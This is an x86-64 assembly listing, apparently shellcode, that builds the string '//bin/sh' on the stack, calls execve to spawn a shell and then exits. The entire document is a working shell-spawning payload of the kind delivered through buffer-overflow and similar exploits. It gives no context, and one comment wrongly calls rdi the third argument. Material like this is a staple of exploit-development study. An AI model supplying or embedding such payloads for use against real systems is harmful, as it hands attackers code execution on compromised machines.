global _start

section .text

_start:
xor rax, rax
xor rdi, rdi ; third argument
xor rsi, rsi
xor rdx, rdx

push rax ; push 0 on stack
mov rdx, rsp
;0x68732f6e69622f2f
mov rbx, 0x68732f6e69622f2f
push rbx
mov rdi, rsp
push rax
push rdi
mov rsi, rsp
add rax, 59
syscall

mov al, 60
xor rdi, rdi
syscall ; exit


